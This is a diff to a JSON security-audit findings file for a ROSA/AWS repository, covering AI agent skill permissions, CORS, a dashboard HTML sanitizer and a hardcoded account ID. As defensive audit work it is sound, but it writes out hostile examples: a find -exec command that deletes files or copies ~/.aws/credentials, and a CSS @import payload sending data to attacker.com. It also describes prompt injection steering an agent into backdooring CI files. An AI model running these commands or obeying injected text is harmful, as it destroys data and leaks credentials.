@@ -1,6 +1,6 @@
 {
-  "scan_date": "2026-06-29",
-  "commit": "9e588ec",
+  "scan_date": "2026-07-02",
+  "commit": "2cdcf94",
   "findings": [
     {
       "id": "L2",
@@ -255,18 +255,6 @@
       "recommendation": "Use readOnlyRootFilesystem on the kube-proxy sidecar (already set) but additionally: (1) Set the kubeconfig file to read-only after creation (chmod 400), (2) Use a named pipe or env-var injection instead of a file where possible, (3) Restrict the S3 sync in entrypoint.sh from syncing .kube/ contents to audit storage."
     },
     {
-      "id": "M13",
-      "title": "Adversary Agent Missing Explicit File-Write Scope Constraint",
-      "severity": "medium",
-      "category": "Agent/Skill — Missing Safety Guardrails",
-      "file": ".claude/agents/adversary.md",
-      "line": 159,
-      "end_line": 201,
-      "issue": "The Output Format section instructs the agent to write findings to adversary-findings.json, but the agent definition contains no explicit constraint preventing it from writing to other files. With unrestricted Bash access, a prompt injection could cause the agent to overwrite project source files, CI configuration, or secrets.",
-      "impact": "A manipulated agent could overwrite deploy/regional/*.tf, .github/workflows/*.yml, or entrypoint.sh, introducing backdoors into infrastructure definitions or CI pipelines. The SARIF upload workflow would then surface the tampered content as an authorized security scan result.",
-      "recommendation": "Add explicit guardrails to the agent definition: 'Do NOT write to any file other than adversary-findings.json at the repository root. Do NOT modify source code, infrastructure files, CI/CD configurations, or any file in deploy/, lambda/, .github/, or internal/. Do NOT execute git push, git commit, or any command that modifies remote state.'"
-    },
-    {
       "id": "M14",
       "title": "GitHub Actions Workflows Use Mutable Action Tags Without SHA Pinning",
       "severity": "medium",
@@ -339,6 +327,18 @@
       "recommendation": "Restrict egress to known endpoints using VPC endpoints for SSM, S3, ECR, ECS, Bedrock, EFS, KMS, and CloudWatch Logs. Replace the catch-all egress rule with specific rules for:\n- Port 443 to the VPC endpoints for required AWS services\n- Port 2049 to the EFS security group (for NFS mount)\n- Port 443 to known ROSA API server CIDR ranges if direct cluster access is required"
     },
     {
+      "id": "H5",
+      "title": "Bash(find . *) in SKILL.md Allows Arbitrary Command Execution via -exec",
+      "severity": "high",
+      "category": "Agent/Skill — Overly Broad Tool Access",
+      "file": ".claude/skills/adversary/SKILL.md",
+      "line": 7,
+      "end_line": null,
+      "issue": "The allowed-tools entry Bash(find . *) matches any find invocation, including find . -exec rm -rf {} \\; or find . -execdir sh -c 'cat ~/.aws/credentials > /tmp/out' \\;. The Bash scoping mechanism validates only the command prefix, not subsequent flags, making -exec and -execdir freely available.",
+      "impact": "An adversarially crafted repo (malicious CLAUDE.md, prompt injection via scanned file content, or injected tool output) could cause Claude to execute find . -exec <arbitrary_command> {} \\; with user-level privileges — enabling data exfiltration, file destruction, or lateral movement using task-role credentials available in the SRE container environment.",
+      "recommendation": "Replace Bash(find . *) with Bash(find . -type f *) to prevent -exec usage. Additionally replace Bash(bash scripts/*) and Bash(python3 scripts/*) with specific script calls: Bash(bash scripts/detect-stack.sh *), Bash(bash scripts/repo-stats.sh *), Bash(bash scripts/find-images.sh *), Bash(python3 scripts/serve-dashboard.py *). Add an explicit instruction to SKILL.md: 'When using find, never use -exec or -execdir.'"
+    },
+    {
       "id": "H4",
       "title": "AWS Account ID Hardcoded in Keycloak IRSA Service Account Annotation",
       "severity": "high",
@@ -349,6 +349,66 @@
       "issue": "The Keycloak external-secrets service account has the IAM role ARN hardcoded in its annotation: eks.amazonaws.com/role-arn: arn:aws:iam::641875867446:role/dev-keycloak. This exposes the AWS account ID (641875867446) in source control.",
       "impact": "AWS account IDs are not considered secrets by themselves, but exposing them in public or semi-public repositories enables targeted account enumeration attacks. An attacker can use the known account ID to attempt cross-account IAM role assumption, enumerate public S3 buckets or AMIs, and craft more precise phishing or social engineering attacks against AWS support. If this repository is or becomes public, the account ID exposure is permanent in git history.",
       "recommendation": "Replace the hardcoded ARN with a Kustomize variable substitution or a separate secrets-managed reference that is not committed:\n\nannotations:\n  eks.amazonaws.com/role-arn: $(EXTERNAL_SECRETS_ROLE_ARN)\n\nAlternatively, use an ExternalSecret or ConfigMap to inject the role ARN at deploy time from a parameter that is not stored in the repository."
+    },
+    {
+      "id": "M20",
+      "title": "Dashboard Server Sets Wildcard CORS on /api/report — Security Findings Leakable to Any Origin",
+      "severity": "medium",
+      "category": "Web Application — CORS Misconfiguration",
+      "file": ".claude/skills/adversary/scripts/serve-dashboard.py",
+      "line": 76,
+      "end_line": 79,
+      "issue": "_cors_headers() applies Access-Control-Allow-Origin: * to all endpoints including /api/report (security findings JSON) and /api/events (SSE). Although the server binds to 127.0.0.1, the wildcard CORS header permits any web page open in the user's browser to fetch http://localhost:8450/api/report and read the complete security report.",
+      "impact": "A malicious site visited while the dashboard is running can silently exfiltrate the full findings JSON — including vulnerability descriptions, IAM misconfigurations, file paths, and credential exposure details — to an attacker-controlled server via a background fetch.",
+      "recommendation": "Remove CORS headers from /api/report and /api/events entirely — both are consumed by the same-origin dashboard HTML and do not require CORS. If CORS is needed for development tooling, restrict to the server's own origin: Access-Control-Allow-Origin: http://localhost:{port}. Add X-Frame-Options: DENY and a restrictive Content-Security-Policy to the dashboard HTML response."
+    },
+    {
+      "id": "M21",
+      "title": "Custom HTML Sanitizer Missing <style> Tag Removal — CSS Injection in Dashboard",
+      "severity": "medium",
+      "category": "Web Application — XSS / Content Injection",
+      "file": ".claude/skills/adversary/assets/dashboard-live.html",
+      "line": 744,
+      "end_line": 771,
+      "issue": "sanitizeHtml() removes script, iframe, object, embed, link, and meta elements but does not remove <style> tags. Report data is rendered via el.innerHTML = sanitizeHtml(data.sections[key]) (line 899). A crafted finding field containing <style>@import url('https://attacker.com/?x=' + ...)</style> or CSS attribute selectors would execute. Additionally, only javascript: scheme is blocked in href/src — data:text/html URIs that execute scripts on some browsers are not filtered.",
+      "impact": "If a scanned repository embeds a CSS injection payload in a filename, comment, or identifier that appears verbatim in a finding description, the dashboard renders it as live CSS. CSS-based data exfiltration can leak file path substrings, finding IDs, and DOM attribute values to an external server without triggering script-based XSS mitigations.",
+      "recommendation": "Add style to the element removal list on line 745: querySelectorAll('script, iframe, object, embed, link, meta, style'). Extend URL filtering to block data: scheme alongside javascript: on line 759. For plain-text fields (title, issue), use textContent assignment rather than innerHTML. Consider replacing the custom sanitizer with DOMPurify for more complete coverage."
+    },
+    {
+      "id": "M22",
+      "title": "Local SKILL.md Override Removes adversary-findings.json Write Instruction — SARIF Audit Trail Broken",
+      "severity": "medium",
+      "category": "Agent/Skill — Security Governance Gap",
+      "file": ".claude/skills/adversary/SKILL.md",
+      "line": 1,
+      "end_line": null,
+      "issue": "The new .claude/skills/adversary/SKILL.md is the upstream skill template without the rosa-boundary-specific Output Format section that instructs the adversary agent to write all findings to adversary-findings.json. Simultaneously, .claude/settings.json is being deleted, removing the security@rosa-claude-plugins plugin enablement. The local SKILL.md will shadow the plugin-provided version (which does contain the write instruction). Write and Edit are also absent from the new allowed-tools, so the skill cannot update the findings file at all.",
+      "impact": "Future /security:adversary invocations will produce console output only. adversary-findings.json will grow stale. The upload-sarif.yml GitHub Actions workflow will upload outdated findings to GitHub code scanning, causing the security dashboard to show a false clean state while new vulnerabilities go unrecorded.",
+      "recommendation": "Add the Output Format (rosa-boundary specific) section to .claude/skills/adversary/SKILL.md before merging, including the adversary-findings.json schema, the Prior Findings read-before-write instruction, and the write-complete-array constraint. Add Write(adversary-findings.json) to allowed-tools to permit the targeted write. Alternatively, restore .claude/settings.json so the plugin-provided skill version (which includes the write instruction) is used instead of the local override."
+    },
+    {
+      "id": "L10",
+      "title": "SKILL.md Missing model Field — Defaults to Session Model Instead of Sonnet",
+      "severity": "low",
+      "category": "Agent/Skill — Missing Configuration",
+      "file": ".claude/skills/adversary/SKILL.md",
+      "line": 1,
+      "end_line": 8,
+      "issue": "The SKILL.md frontmatter does not include a model: field. The previous .claude/agents/adversary.md specified model: sonnet. Without an explicit model constraint, the skill inherits the current session model, which may be a more expensive tier than necessary for a security scanning task.",
+      "impact": "Elevated token cost per adversary invocation when called from an opus or higher session. No direct security risk.",
+      "recommendation": "Add model: sonnet to the SKILL.md frontmatter after the allowed-tools line."
+    },
+    {
+      "id": "L11",
+      "title": "Wildcarded Script Execution Paths Allow Any Future Script in scripts/ to Auto-Execute",
+      "severity": "low",
+      "category": "Agent/Skill — Overly Broad Tool Access",
+      "file": ".claude/skills/adversary/SKILL.md",
+      "line": 7,
+      "end_line": null,
+      "issue": "The allowed-tools entries Bash(bash scripts/*) and Bash(python3 scripts/*) grant execution permission to any file present or future under the scripts/ directory. A contributor adding a new script does not need to update allowed-tools, bypassing the intended review gate that explicit tool scoping provides.",
+      "impact": "A future malicious or buggy script introduced via PR or supply chain attack on the plugin would be silently executable by the adversary skill with no allowed-tools diff surfacing in code review.",
+      "recommendation": "Replace wildcarded entries with specific script calls: Bash(bash scripts/detect-stack.sh *), Bash(bash scripts/repo-stats.sh *), Bash(bash scripts/find-images.sh *), Bash(python3 scripts/serve-dashboard.py *). New scripts require an explicit allowed-tools update, surfacing the expansion in review."
     }
   ]
 }
